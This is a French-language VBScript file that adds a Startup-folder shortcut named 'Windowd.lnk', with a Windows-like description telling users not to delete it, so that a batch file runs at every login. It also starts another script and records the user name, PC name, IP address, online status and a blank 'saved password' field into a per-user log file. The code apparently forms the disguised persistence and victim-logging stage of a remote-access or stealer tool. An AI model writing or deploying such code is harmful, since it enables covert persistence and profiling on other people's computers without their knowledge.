cheminSource = "C:\Users\faniz\Downloads\yo\CMD\execStartSource.bat"

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objShell = CreateObject("WScript.Shell")
dossierDestination = objShell.SpecialFolders("Startup")

nomRaccourci = "Windowd.lnk"
cheminDestination = dossierDestination & "\" & nomRaccourci

Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\Users\faniz\Downloads\yo\VBS\StartSource.vbs"

If objFSO.FileExists(cheminDestination) Then
    objFSO.DeleteFile cheminDestination
End If

Set objShellLink = objShell.CreateShortcut(cheminDestination)

objShellLink.TargetPath = cheminSource
objShellLink.IconLocation = "wscript.exe, 1"
objShellLink.Description = "Window Ne pas suprimer !!!"

objShellLink.Save

Set objShellLink = Nothing

Set objFSO = CreateObject("Scripting.FileSystemObject")

cheminRepertoire = "C:\Users\faniz\Downloads\yo\VARTXT\Users"

If Not objFSO.FolderExists(cheminRepertoire) Then
    objFSO.CreateFolder cheminRepertoire
End If

Set objNetwork = CreateObject("WScript.Network")
nomSession = objNetwork.UserName
nomPC = objNetwork.ComputerName

Function GetIPAddress()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    
    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then
            GetIPAddress = objItem.IPAddress(0)
            Exit Function
        End If
    Next
End Function

Function IsSessionActive()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * From Win32_ComputerSystem")
    
    For Each objItem In colItems
        If InStr(objItem.UserName, nomSession) > 0 And objItem.Name = nomPC Then
            IsSessionActive = "🟢"
            Exit Function
        End If
    Next
    
    IsSessionActive = "🔴"
End Function

adresseIP = GetIPAddress()
sessionActive = IsSessionActive()

cheminFichierTexte = cheminRepertoire & "\" & nomSession & ".txt"

If objFSO.FileExists(cheminFichierTexte) Then
    Set objFile = objFSO.OpenTextFile(cheminFichierTexte, 2, True)
Else
    Set objFile = objFSO.CreateTextFile(cheminFichierTexte)
End If

objFile.WriteLine "---------- INFORMATION ----------"
objFile.WriteLine "Nom de la session: " & nomSession
objFile.WriteLine "Nom du PC: " & nomPC
objFile.WriteLine "Adresse IP: " & adresseIP
objFile.WriteLine "Mot de passe enregistré: "
objFile.WriteLine "--------------------------------------------"
objFile.WriteLine "               ONLINE:" & sessionActive

objFile.Close

Set objFile = Nothing
Set objFSO = Nothing
Set objNetwork = Nothing
